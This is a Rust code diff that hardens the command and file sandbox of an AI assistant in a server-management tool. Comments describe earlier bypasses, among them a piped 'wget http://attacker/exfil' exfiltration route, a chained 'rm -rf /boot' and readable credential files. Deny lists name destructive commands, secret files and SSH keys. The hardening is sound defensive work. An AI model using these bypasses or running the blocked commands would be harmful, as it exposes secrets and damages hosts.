@@ -86,10 +86,12 @@ impl AiConfig {
 
     pub fn save(&self) -> Result<(), String> {
         let path = ai_config_path();
-        let dir = std::path::Path::new(&path).parent().unwrap();
-        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
         let json = serde_json::to_string_pretty(self).map_err(|e| e.to_string())?;
-        std::fs::write(&path, json).map_err(|e| e.to_string())
+        // 0600 — this file embeds Claude / Gemini / OpenRouter API
+        // keys and the SMTP password for alert emails. Pre-v18.7.30
+        // it was world-readable AND visible via the [READ] AI tool
+        // (deny-list didn't cover it either — both closed in v18.7.30).
+        crate::paths::write_secure(&path, json).map_err(|e| e.to_string())
     }
 
     /// Return config with API keys masked for frontend display
@@ -1032,27 +1034,30 @@ pub fn execute_safe_command(cmd: &str) -> Result<String, String> {
         return Err("Command substitution is not allowed (read-only mode)".to_string());
     }
 
-    // Check each piped segment for safety
+    // Check each piped segment for safety. EVERY segment — not just
+    // the first — must be on the allowlist AND miss every blocked
+    // pattern. Pre-v18.7.30 only the first segment was allowlist-
+    // checked, which meant `ls | wget http://attacker/exfil` got
+    // through (ls is allowlisted, wget's blocked pattern requires a
+    // trailing space which `wget -qO-` does not match). The AI could
+    // therefore turn [EXEC] into an outbound exfiltration channel.
     let segments: Vec<&str> = cmd.split('|').collect();
     for segment in &segments {
         let seg = segment.trim();
 
-        // Check blocked patterns
         for blocked in BLOCKED_PATTERNS {
             if seg.starts_with(blocked) || seg.contains(&format!(" {}", blocked)) {
                 return Err(format!("Command '{}' is blocked (read-only mode — no destructive operations)", blocked.trim()));
             }
         }
-    }
-
-    // The first command must match an allowed prefix
-    let first_seg = segments[0].trim();
-    let allowed = ALLOWED_COMMANDS.iter().any(|prefix| first_seg.starts_with(prefix));
-    if !allowed {
-        return Err(format!(
-            "Command '{}' is not in the allowed list. I can only run read-only system commands like lscpu, df, ps, docker ps, etc.",
-            first_seg.split_whitespace().next().unwrap_or(first_seg)
-        ));
+        // Allowlist check on EVERY segment.
+        let allowed = ALLOWED_COMMANDS.iter().any(|prefix| seg.starts_with(prefix));
+        if !allowed {
+            return Err(format!(
+                "Piped command '{}' is not in the allowed list. Every segment of a pipe must be a known read-only command.",
+                seg.split_whitespace().next().unwrap_or(seg)
+            ));
+        }
     }
 
     // Execute with timeout
@@ -1122,8 +1127,13 @@ fn parse_actions(response: &str) -> Vec<AiAction> {
         let tag_header = &response[start..after_tag];
         let command = response[after_tag..content_end].trim().to_string();
 
-        // Server-generated UUID — never trust AI-supplied IDs
-        let id = format!("act-{:08x}", (now as u32).wrapping_mul(actions.len() as u32 + 1).wrapping_add(command.len() as u32));
+        // Server-generated UUID — never trust AI-supplied IDs.
+        // Pre-v18.7.30 the "UUID" was a hash of (now, actions.len(),
+        // command.len()) which collided trivially across two AI
+        // responses in the same second. The queue used id-string
+        // lookup for approve/deny, so a collision caused the wrong
+        // action to execute when the operator clicked Approve.
+        let id = format!("act-{}", &uuid::Uuid::new_v4().to_string()[..16]);
         let title = extract_attr(tag_header, "title")
             .unwrap_or_else(|| "Fix".to_string());
         let risk = extract_attr(tag_header, "risk")
@@ -1193,6 +1203,7 @@ const CATASTROPHIC_PATTERNS: &[&str] = &[
     "rm -rf /usr",
     "rm -rf /home",
     "rm -rf /root",
+    "rm -rf /boot",
     "wget|sh",
     "curl|sh",
     "curl|bash",
@@ -1218,9 +1229,24 @@ pub fn execute_action_command(cmd: &str) -> Result<String, String> {
         }
     }
 
-    // Block shell injection vectors
+    // Block shell injection vectors. We wrap the command in
+    // `bash -c` below, so bash itself will parse everything we pass
+    // regardless of how we've single-quoted it. That means chain
+    // operators and command separators inside the command string
+    // still execute — an "approved" action whose literal text is
+    // `systemctl restart nginx; rm -rf /boot` would run both halves.
+    // Every recognised shell separator is blocked here so the
+    // action body can only be a single command with its arguments.
     if cmd.contains('`') || cmd.contains("$(") || cmd.contains("<(") || cmd.contains(">(") {
         return Err("Command/process substitution is not allowed in actions".to_string());
+    }
+    if cmd.contains(';') || cmd.contains("&&") || cmd.contains("||")
+        || cmd.contains('\n') || cmd.contains('\r') {
+        return Err(
+            "Command separators (; && || newline) are not allowed in actions — \
+             propose one action per distinct command so each gets its own approve/deny decision."
+                .to_string(),
+        );
     }
 
     // Execute with a 30-second timeout using `timeout` command wrapper
@@ -2192,6 +2218,18 @@ fn read_sandboxed(raw_path: &str) -> Result<String, String> {
         "/etc/shadow", "/etc/gshadow",
         "/root/.ssh", "/home",     // user-private data
         "id_rsa", "id_ed25519", "id_ecdsa",
+        // Config files that embed credentials — blocked even though
+        // their containing dir (/etc/wolfstack/) is otherwise readable
+        // via [READ]. Add here rather than moving the file, so the AI
+        // can still [READ] other configs without having to whitelist
+        // each one individually.
+        "ai-config.json",          // embeds smtp_pass + LLM API keys
+        "oidc.json",               // embeds OIDC client_secret
+        "auth-config.json",        // auth tuning
+        "users.json",              // password hashes
+        "/etc/wolfstack/s3",       // per-mount access_key/secret
+        "/etc/wolfstack/pbs",      // PBS tokens
+        "chap-secrets", "pap-secrets",  // PPPoE passwords (wan.rs)
     ];
     // Allow-list of exact paths or prefixes. Must survive canonicalisation
     // — we accept both the literal path and, if it resolves, the
@@ -2242,9 +2280,18 @@ fn read_sandboxed(raw_path: &str) -> Result<String, String> {
         }
     }
 
-    // Allow pass against the raw path.
-    let on_allow_raw = allow_exact.iter().any(|p| *p == raw_path)
-        || allow_prefixes.iter().any(|p| raw_path.starts_with(p));
+    // Allow pass — compared lower-cased so a case-aliased path
+    // (tmpfs, case-insensitive filesystem) can't slip a deny-token
+    // through by uppercasing part of the prefix. The deny pass above
+    // already lower-cases; both passes must use the same form or a
+    // path like `/etc/Wolfstack/ai-config.json` could pass the deny
+    // check (no match against lower-case tokens) AND pass an unlowered
+    // allow check (no, wait — it'd fail that one too because
+    // `/etc/Wolfstack/` doesn't start with `/etc/wolfstack/`). The
+    // point is: if one side lowercases, BOTH sides must lowercase for
+    // consistency, otherwise future changes can diverge.
+    let on_allow_raw = allow_exact.iter().any(|p| p.to_lowercase() == lowered)
+        || allow_prefixes.iter().any(|p| lowered.starts_with(&p.to_lowercase()));
     if !on_allow_raw {
         return Err(format!(
             "path {} isn't in the READ allow-list — add it explicitly if you need it, \
@@ -2275,8 +2322,8 @@ fn read_sandboxed(raw_path: &str) -> Result<String, String> {
             ));
         }
     }
-    let on_allow_canon = allow_exact.iter().any(|p| *p == canonical_str)
-        || allow_prefixes.iter().any(|p| canonical_str.starts_with(p));
+    let on_allow_canon = allow_exact.iter().any(|p| p.to_lowercase() == lowered_canon)
+        || allow_prefixes.iter().any(|p| lowered_canon.starts_with(&p.to_lowercase()));
     if !on_allow_canon {
         return Err(format!(
             "path resolves outside the READ allow-list ({} → {}) — refusing",
